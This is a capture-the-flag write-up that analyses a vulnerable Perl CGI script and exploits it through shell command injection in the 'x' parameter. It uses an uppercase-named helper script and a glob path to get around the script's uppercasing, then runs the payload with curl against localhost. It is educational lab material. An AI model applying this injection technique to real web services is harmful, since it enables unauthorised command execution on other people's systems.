# Level 12

## Initial Context

- A single file: `level12.lua`

## Solving the Challenge

### Analyzing

There is only a CGI perl script:

```perl
$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

We can see it takes two parameters to call the method `t`:
- `?y` stored in `$nn` but never used.
- `?x` stored in `$xx`:
  - using a regex, all characters are replaced as their uppercase version:
    ```
    .----------- translate (a.k.a replace)
    |   .------- all characters from 'a' to 'z'
    |   |   .--- to all characters from 'A' to 'Z'
    |   |   |
    tr/a-z/A-Z/
    ```
  - using a regex, if content start with a space, all content is replaced with nothing:
    ```
    .---------- search
    | .-------- 1 any space characters (equivalent to [\r\n\t\f\v ])
    | | .------ any any characters
    | | |.----- between zero and unlimited times
    | | || .--- replace it with nothing
    | | || |
    s/\s.*//
    ```
  - then it is used for a command:
    ```
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    ```

So using a subshell, we should be able to execute custom commands.

But since every character are in uppercase, commands will break. Executing a script can overcome this problem.

### Exploiting

The script name must be in uppercase.

```bash
$ echo 'getflag > /tmp/level12' > /tmp/LEVEL12.SH
$ chmod a+rx /tmp/LEVEL12.SH
```

But since we cannot uppercase `/tmp/` we will have to use bash's expender `*`. That means that `/*/LEVEL12.SH` will resolve to `/tmp/LEVEL12.SH` since no other directory in `/` have a file named `LEVEL12.SH`.

```bash
$ ls /*/LEVEL12.SH
/tmp/LEVEL12.SH
```

Now we can exploit the script by doing an HTTP request to `localhost:4646` (mentioned at the top of the script).

```bash
$ curl http://localhost:4646?x='$(/*/LEVEL12.SH)'
..
```

And we can see our flag with:

```bash
$ cat /tmp/level12
Check flag.Here is your token : ....
```